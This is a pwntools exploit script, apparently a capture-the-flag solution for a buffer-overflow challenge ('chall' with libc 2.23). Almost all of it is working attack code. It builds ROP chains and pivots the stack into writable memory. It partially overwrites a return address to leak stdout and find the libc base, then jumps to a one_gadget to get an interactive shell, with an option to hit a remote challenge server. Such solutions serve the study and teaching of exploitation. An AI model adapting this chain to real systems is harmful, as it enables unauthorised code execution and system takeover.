from pwn import *

read = 0x400410
pop_rdi = 0x000000000040049c
pop_rsi = 0x000000000040049e
pop_rbp = 0x000000000040047c
leave =   0x0000000000400499
stdout = 0x601020
stderr = 0x601040
stack2 = 0x601800
setbuf = 0x0000000000400400
stack3 = 0x601c00
ret = 0x000000000040049d

stack_ret = 0x6017e8
main = 0x000000000040047e

#context.log_level = 'debug'

is_remote = False
#is_remote = True

#base = 0x9e4000
libc = ELF('./libc-2.23.so')

fwrite = libc.symbols['_IO_file_write']

one_gadget = 0xf1147
if is_remote:
    def create_proc():
#        return remote('172.17.0.3', 2323)
        return remote('13.231.207.73', 9002)
else:
    def create_proc():
        return process('./chall')

def send_rop(p, rop, padding=0x28, after=b''):
    pay = b'A' * padding + b''.join(map(p64, rop))
    pay = pay.ljust(0x200 - len(after), b'\0')
    p.send(pay + after)

_sleep = sleep
def sleep(s):
    print('sleeping...')
    _sleep(s)
    print('no sleep')

def exploit():
    global base,p
    expect_good = False
    p = create_proc()
    base = random.randint(0, 16) * 0x1000
    if not is_remote:
        base2 = p.libs()['/home/henry/zeropts/bof/libc-2.23.so']
        print(hex(base2 & 0xffff))
        if base2 & 0xffff == 0:
            print('!!!!')

    # Step 1: prep pop_rdi, stdout, ... rop chain
    rop = [pop_rsi, stdout - 8, read,
            pop_rsi, stdout + 8, read, 
            pop_rsi, stack2, read,
            pop_rsi, stack3, read,
            pop_rbp, stdout - 16, leave]
    send_rop(p, rop)
    sleep(.5)
    p.send(p64(pop_rdi))
   # print('Wait for finish read')
    sleep(1)
    
    #   [AFTER stdout area]: pivot to stack2
    try:
        rop = [pop_rbp, stack2 - 8, leave]
        send_rop(p, rop, padding=0)
        sleep(1)
    except EOFError:
        print("ERROR")
        return False

    #   [STACK2]: call setbuf(rdi, 0), pivot to stack3
    rop = [pop_rsi, 0, setbuf, pop_rbp, stack3 - 8, leave]
    send_rop(p, rop, padding=0)
    sleep(1)

    #   [STACK3]: jmp main
    rop = [main]
    send_rop(p, rop, padding = 0)
    sleep(1)

    # Step 2: now do read again and partial overwrite our stuff, and leak our
    # stuff
    #  - Read stack_ret area, which will do partial overwrite and call fwrite leak
    #  - Read stack2 area
    #  - Pivot to [BEFORE stdout], which pivots to stack2
    rop = [pop_rsi, stack_ret - 0x200 + 2, read,
            pop_rsi, stack_ret + 8, read,
            pop_rsi, stack2, read,
            pop_rbp, stdout - 16, leave]
    send_rop(p, rop)
    sleep(1)

    try:
        # [STACK_RET] Do partial overwrite
        send_rop(p, [], padding=6, after=(p64(base + fwrite)[:2]))
        sleep(1)

        # [after STACK_RET] jump to main and reset
        send_rop(p, [main], padding=0)
        sleep(1)

        # [STACK2] Prepare rsi, (rdx = 0x200, rdi set to stdout), pivot to STACK_RET
        rop = [pop_rsi, stdout, 
                pop_rbp, stack_ret - 8, leave]
        send_rop(p, rop, padding=0)
        sleep(1)

        leak = p.recvn(0x200)[:8]
        log.info('Leaked: %s', enhex(leak))

        libc_base = u64(leak) - libc.symbols['_IO_2_1_stdout_']
        log.info('Libc base: %016x', libc_base)

        send_rop(p, [one_gadget + libc_base])
        p.interactive()
        return True
    except EOFError:
        print(p.recvall())
        p.close()
        return False

while True:
    try:
        if exploit():
            break
    except:
        p.interactive()
        break
